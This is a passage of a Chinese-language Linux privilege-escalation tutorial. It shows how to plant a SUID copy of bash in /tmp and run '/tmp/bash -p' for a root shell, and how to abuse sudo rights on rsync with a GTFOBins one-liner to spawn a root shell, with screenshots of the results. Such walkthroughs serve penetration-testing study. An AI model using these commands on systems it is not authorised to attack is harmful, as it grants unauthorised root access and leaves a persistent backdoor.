<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cp /bin/bash /tmp &amp;&amp; chmod 4755 /tmp/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165048496-2019856568-0b6d53b35bddf138a3e4dba15030df66.png" width="789" height="196" class="img_ev3q"></p>
<p>将上面的两个命令复制并粘贴到终端后，除了退出并返回到常规提示符之外，我们看不到任何其他内容。</p>
<p>但是当我们检查/tmp目录时，我们可以看到 SUID bash 正在等待着我们！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165047203-2062382184-60b9677cf5eb4d4ea63a563dc463f0f8.png" width="866" height="142" class="img_ev3q"></p>
<p>现在我们可以简单地使用以下命令进入稳定的 root shell：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/bash -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165047512-1679775982-aba1bc8c6c204da9a1f69a87dfa0904a.png" width="546" height="78" class="img_ev3q"></p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="412rsync"><strong><div id="id4.1.2">4.1.2、Rsync</div></strong><a href="#412rsync" class="hash-link" aria-label="412rsync的直接链接" title="412rsync的直接链接">​</a></h6>
<p>Rsync 是更容易利用并进入 root shell 的二进制文件之一。</p>
<p>检查 GTFOBins，我们可以看到可以通过单个命令来利用这一点。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="831" height="172" class="img_ev3q"></p>
<p>并测试漏洞利用，它起作用并让我们进入root shell！</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo /usr/bin/rsync -e &#x27;sh -c &quot;sh 0&lt;&amp;2 1&gt;&amp;2&quot;&#x27; 127.0.0.1:/dev/null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
